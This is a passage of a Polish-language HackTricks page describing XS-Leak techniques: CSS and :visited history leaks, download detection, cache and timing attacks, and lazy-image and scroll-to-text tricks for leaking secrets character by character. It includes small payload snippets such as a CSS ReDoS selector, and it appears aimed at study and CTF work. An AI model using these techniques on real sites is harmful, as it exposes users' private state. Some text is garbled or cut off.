[Czytaj wicej o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Ten element ujawnia `height` i `width` obrazu. Jednak jeli obraz jest nieprawidowy, te waciwoci zwr贸c 0, a funkcja `image.decode()` zostanie odrzucona, co wskazuje na niepowodzenie poprawnego wczytania obrazu.
[Czytaj wicej o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


### Waciwo CSS

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **Podsumowanie**: Zidentyfikuj zmiany w stylizacji strony internetowej, kt贸re koreluj ze stanem u偶ytkownika.
* **Przykad kodu**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Aplikacje internetowe mog zmienia **stylizacj strony internetowej** w zale偶noci od stanu u偶ytkownika. Na stronie atakujcego mo偶na osadzi pliki CSS z innych domen za pomoc **elementu link HTML**, a **reguy** zostan **zastosowane** do strony atakujcego. Jeli strona dynamicznie zmienia te reguy, atakujcy mo偶e **wykry** te **r贸偶nice** w zale偶noci od stanu u偶ytkownika.\
Jako technik wycieku atakujcy mo偶e u偶y metody `window.getComputedStyle`, aby **odczyta waciwoci CSS** okrelonego elementu HTML. W rezultacie atakujcy mo偶e odczyta dowolne waciwoci CSS, jeli znane s dotknite elementy i nazwa waciwoci.

### Historia CSS

* **Metody wczenia**: Elementy HTML
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **Podsumowanie**: Wykryj, czy styl `:visited` jest zastosowany do adresu URL, wskazujc, 偶e zosta ju偶 odwiedzony
* **Przykad kodu**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Wedug [**tego**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), to nie dziaa w headless Chrome.
{% endhint %}

Selektor CSS `:visited` jest wykorzystywany do stylizacji adres贸w URL w inny spos贸b, jeli zostay one wczeniej odwiedzone przez u偶ytkownika. W przeszoci metoda `getComputedStyle()` moga by wykorzystana do identyfikacji tych r贸偶nic stylu. Jednak nowoczesne przegldarki wprowadziy rodki bezpieczestwa, kt贸re uniemo偶liwiaj tej metodzie ujawnienie stanu linku. rodki te obejmuj zawsze zwracanie obliczonego stylu tak, jakby link by odwiedzony, oraz ograniczenie styl贸w, kt贸re mo偶na zastosowa za pomoc selektora `:visited`.

Mimo tych ogranicze mo偶liwe jest porednie rozpoznanie stanu odwiedzonego linku. Jedn z technik jest wprowadzenie u偶ytkownika w bd, aby wchodzi w interakcj z obszarem objtym CSS, w szczeg贸lnoci wykorzystujc waciwo `mix-blend-mode`. Ta waciwo umo偶liwia mieszanie element贸w z ich tem, potencjalnie ujawniajc stan odwiedzenia na podstawie interakcji u偶ytkownika.

Ponadto, wykrycie mo偶na osign bez interakcji u偶ytkownika, wykorzystujc czasy renderowania link贸w. Poniewa偶 przegldarki mog renderowa odwiedzone i nieodwiedzone linki w inny spos贸b, mo偶e to wprowadzi mierzaln r贸偶nic czasu w renderowaniu. W raporcie bdu Chromium wspomniano o dowodzie koncepcji (PoC), kt贸ry demonstruje t technik za pomoc wielu link贸w w celu wzmocnienia r贸偶nicy czasowej, co umo偶liwia wykrycie stanu odwiedzenia poprzez analiz czasu.

Aby uzyska wicej szczeg贸贸w na temat tych waciwoci i metod, odwied
### Wyciek X-Frame w ContentDocument

* **Metody wczenia**: Ramki
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **Podsumowanie**: W przegldarce Google Chrome, pojawia si dedykowana strona bdu, gdy strona jest blokowana przed osadzeniem na stronie o innym pochodzeniu ze wzgldu na ograniczenia X-Frame-Options.
* **Przykad kodu**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

W Chrome, jeli strona z nag贸wkiem `X-Frame-Options` ustawionym na "deny" lub "same-origin" jest osadzana jako obiekt, pojawia si strona bdu. Chrome zwraca unikalny pusty obiekt dokumentu (zamiast `null`) dla waciwoci `contentDocument` tego obiektu, w przeciwiestwie do iframe'贸w lub innych przegldarek. Atakujcy mog wykorzysta to, wykrywajc pusty dokument, potencjalnie ujawniajc informacje o stanie u偶ytkownika, zwaszcza jeli programici niesp贸jnie ustawiaj nag贸wek X-Frame-Options, czsto pomijajc strony bd贸w. wiadomo i konsekwentne stosowanie nag贸wk贸w zabezpiecze s kluczowe dla zapobiegania takim wyciekom.


### Wykrywanie pobierania

* **Metody wczenia**: Ramki, Wyskakujce okna
* **Wykrywalna r贸偶nica**: Nag贸wki
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **Podsumowanie**: Atakujcy mo偶e rozpozna pobieranie plik贸w, wykorzystujc iframe'y; kontynuowane dostpno iframe'a sugeruje udane pobranie pliku.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Nag贸wek `Content-Disposition`, a konkretnie `Content-Disposition: attachment`, instruuje przegldark do pobrania zawartoci zamiast wywietlania jej wewntrznie. To zachowanie mo偶e by wykorzystane do wykrywania, czy u偶ytkownik ma dostp do strony, kt贸ra wywouje pobieranie pliku. W przegldarkach opartych na Chromium istnieje kilka technik wykrywania tego zachowania pobierania:

1. **Monitorowanie paska pobierania**:
- Gdy plik jest pobierany w przegldarkach opartych na Chromium, na dole okna przegldarki pojawia si pasek pobierania.
- Monitorujc zmiany wysokoci okna, atakujcy mog wnioskowa o pojawieniu si paska pobierania, sugerujc rozpoczcie pobierania.

2. **Nawigacja pobierania za pomoc iframe'贸w**:
- Gdy strona wywouje pobieranie pliku za pomoc nag贸wka `Content-Disposition: attachment`, nie powoduje to zdarzenia nawigacji.
- adujc zawarto w iframe'ie i monitorujc zdarzenia nawigacji, mo偶na sprawdzi, czy nag贸wek content disposition powoduje pobranie pliku (brak nawigacji) czy nie.

3. **Nawigacja pobierania bez u偶ycia iframe'贸w**:
- Podobnie jak w przypadku techniki z iframe'ami, ta metoda polega na u偶yciu `window.open` zamiast iframe'a.
- Monitorowanie zdarze nawigacji w nowo otwartym oknie mo偶e ujawni, czy zostao wywoane pobieranie pliku (brak nawigacji) czy te偶 zawarto jest wywietlana wewntrznie (nastpuje nawigacja).

W przypadkach, gdy tylko zalogowani u偶ytkownicy mog wywoywa takie pobrania, te techniki mog by wykorzystane do poredniego wnioskowania o stanie uwierzytelnienia u偶ytkownika na podstawie odpowiedzi przegldarki na 偶danie pobrania.

### Bypass partycjonowanego cache HTTP <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metody wczenia**: Wyskakujce okna
* **Wykrywalna r贸偶nica**: Czas
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **Podsumowanie**: Atakujcy mo偶e rozpozna pobieranie plik贸w, wykorzystujc iframe'y; kontynuowane dostpno iframe'a sugeruje udane pobranie pliku.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (z [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
To dlatego ta technika jest interesujca: Chrome ma teraz **partycjonowanie pamici podrcznej**, a klucz pamici podrcznej nowo otwartej strony to: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m=xxx)`, ale jeli otworz stron ngrok i u偶yj fetch w niej, klucz pamici podrcznej bdzie: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **klucz pamici podrcznej jest inny**, wic pami podrczna nie mo偶e by wsp贸dzielona. Wicej szczeg贸贸w mo偶na znale藕 tutaj: [Gaining security and privacy by partitioning the cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentarz z [**tutaj**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Jeli strona `example.com` zawiera zas贸b z `*.example.com/resource`, to ten zas贸b bdzie mia **ten sam klucz pamici podrcznej**, co gdyby zas贸b by bezporednio **偶dany przez nawigacj na najwy偶szym poziomie**. Wynika to z faktu, 偶e klucz pamici podrcznej skada si z _eTLD+1_ na najwy偶szym poziomie i _eTLD+1_ ramki.

Poniewa偶 dostp do pamici podrcznej jest szybszy ni偶 adowanie zasobu, mo偶na spr贸bowa zmieni lokalizacj strony i anulowa j po 20 ms (na przykad). Jeli po zatrzymaniu nastpia zmiana pochodzenia, oznacza to, 偶e zas贸b zosta zapisany w pamici podrcznej.\
Mo偶na r贸wnie偶 **wysa 偶danie fetch do potencjalnie zapisanej w pamici podrcznej strony i zmierzy czas**, jaki to zajmuje.

### Rczne przekierowanie <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metody wczenia**: Fetch API
* **Wykrywalna r贸偶nica**: Przekierowania
* **Wicej informacji**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_
### Zanieczyszczenie skrypt贸w

* **Metody wczenia**: Elementy HTML (skrypt)
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **Podsumowanie**: Mo偶liwe jest **nadpisanie wbudowanych funkcji** i odczytanie ich argument贸w nawet z **skryptu midzydomenowego** (kt贸ry nie mo偶e by odczytany bezporednio), co mo偶e **wycieka cenne informacje**.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Pracownicy usug <a href="#service-workers" id="service-workers"></a>

* **Metody wczenia**: Wyskakujce okienka
* **Wykrywalna r贸偶nica**: Zawarto strony
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **Podsumowanie**: Mierzenie czasu wykonania strony internetowej za pomoc pracownik贸w usugowych.
* **Przykad kodu**:

W podanym scenariuszu atakujcy podejmuje inicjatyw zarejestrowania **pracownika usugowego** w jednej ze swoich domen, konkretnie "attacker.com". Nastpnie atakujcy otwiera nowe okno na stronie docelowej z g贸wnego dokumentu i instruuje **pracownika usugowego** do rozpoczcia odliczania czasu. Gdy nowe okno zaczyna si adowa, atakujcy nawiguje do strony zarzdzanej przez **pracownika usugowego** za pomoc uzyskanego wczeniej odnonika.

Po przybyciu 偶dania zainicjowanego w poprzednim kroku, **pracownik usugowy** odpowiada kodem stanu **204 (No Content)**, co efektywnie koczy proces nawigacji. W tym momencie **pracownik usugowy** rejestruje pomiar z wczeniej rozpocztego timera. Ten pomiar jest wpywany przez czas trwania JavaScriptu powodujcego op贸藕nienia w procesie nawigacji.

{% hint style="warning" %}
Podczas pomiaru czasu wykonania mo偶liwe jest **wyeliminowanie** **czynnik贸w sieciowych** w celu uzyskania **bardziej precyzyjnych pomiar贸w**. Na przykad, poprzez wczytanie zasob贸w u偶ywanych przez stron przed jej zaadowaniem.
{% endhint %}

### Pobieranie czasu

* **Metody wczenia**: Interfejs Fetch
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj zwizany z zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Podsumowanie**: U偶yj [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), aby zmierzy czas wykonania 偶dania. Mo偶na u偶y innych zegar贸w.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Pomiar czasu midzyokienkowego

* **Metody wczenia**: Wyskakujce okienka
* **Wykrywalna r贸偶nica**: Czas (zazwyczaj zwizany z zawartoci strony, kodem stanu)
* **Wicej informacji**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Podsumowanie**: U偶yj [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow), aby zmierzy czas wykonania 偶dania za pomoc `window.open`. Mo偶na u偶y innych zegar贸w.
* **Przykad kodu**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** przy u偶yciu najbardziej zaawansowanych narzdzi spoecznoci na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Za pomoc HTML lub ponownego wstrzykiwania

Tutaj znajdziesz techniki wydobywania informacji z **wstrzykiwania treci HTML midzydomenowego**. Techniki te s interesujce w przypadkach, gdy z jakiego powodu mo偶esz **wstrzykiwa HTML, ale nie mo偶esz wstrzykiwa kodu JS**.

### Wiszce znaczniki

{% content-ref url="dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### Op贸藕nione adowanie obraz贸w

Jeli musisz **wydoby zawarto** i mo偶esz **doda HTML przed sekretem**, powiniene sprawdzi **powszechne techniki wiszcych znacznik贸w**.\
Jednak jeli z jakiego powodu **MUSISZ** to zrobi **znak po znaku** (mo偶e komunikacja odbywa si za pomoc trafienia w pami podrczn), mo偶esz skorzysta z tego triku.

**Obrazy** w HTML maj atrybut "**loading**", kt贸rego warto mo偶e by "**lazy**". W takim przypadku obraz zostanie zaadowany, gdy zostanie wywietlony, a nie podczas adowania strony:
```html
<img src=/something loading=lazy >
```
Dlatego mo偶esz zrobi tak, 偶eby **doda du偶o niepotrzebnych znak贸w** (Na przykad **tysice "W"**) aby **wypeni stron internetow przed sekretem lub doda co takiego jak** `<br><canvas height="1850px"></canvas><br>.`\
Jeli na przykad nasze **wstrzyknicie pojawi si przed flag**, obrazek zostanie **zaadowany**, ale jeli pojawi si **po** fladze, flaga + mieci **uniemo偶liwi jej zaadowanie** (musisz eksperymentowa z iloci mieci do umieszczenia). Tak wanie si stao w [**tym rozwizaniu**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Inn opcj byoby u偶ycie **scroll-to-text-fragment**, jeli jest dozwolone:

#### Scroll-to-text-fragment

Jednak偶e, sprawiasz, 偶e **bot ma dostp do strony** za pomoc czego takiego jak
```
#:~:text=SECR
```
Wic strona internetowa bdzie wyglda mniej wicej tak: **`https://victim.com/post.html#:~:text=SECR`**

Gdzie post.html zawiera niepotrzebne znaki atakujcego i obraz adowany w spos贸b leniwy, a nastpnie dodawany jest sekret bota.

Ten tekst spowoduje, 偶e bot uzyska dostp do dowolnego tekstu na stronie, kt贸ry zawiera tekst `SECR`. Poniewa偶 ten tekst to sekret i znajduje si **poni偶ej obrazu**, obraz zostanie zaadowany tylko wtedy, gdy zgadnity sekret bdzie poprawny. Wic masz swoje 藕r贸do informacji, aby **wycieka sekret znak po znaku**.

Przykad kodu do wykorzystania tego: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Op贸藕nione adowanie obrazu w zale偶noci od czasu

Jeli **nie jest mo偶liwe zaadowanie zewntrznego obrazu**, co mogoby wskaza atakujcemu, 偶e obraz zosta zaadowany, inn opcj jest **pr贸ba zgadnicia znaku kilka razy i zmierzenie tego**. Jeli obraz jest adowany, wszystkie 偶dania bd trway du偶ej ni偶 w przypadku, gdy obraz nie jest adowany. To jest to, co zostao u偶yte w [**rozwizaniu tego opisu**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/), **podsumowane tutaj:**

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Jeli u偶ywane jest `jQuery(location.hash)`, mo偶liwe jest sprawdzenie za pomoc pomiaru czasu, **czy istnieje jaka zawarto HTML**, poniewa偶 jeli selektor `main[id='site-main']` nie pasuje, nie trzeba sprawdza reszty **selektor贸w**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Wstrzykiwanie CSS

{% content-ref url="xs-search/css-injection/" %}
[css-injection](xs-search/css-injection/)
{% endcontent-ref %}

## Obrona

Zalecane s rodki zaradcze opisane w [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), a tak偶e w ka偶dej sekcji wiki [https://xsleaks.dev/](https://xsleaks.dev/). Zapoznaj si tam z dodatkowymi informacjami na temat sposob贸w ochrony przed tymi technikami.

## Odwoania

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby atwo tworzy i **automatyzowa zadania** przy u偶yciu najbardziej zaawansowanych narzdzi spoecznociowych na wiecie.\
Otrzymaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
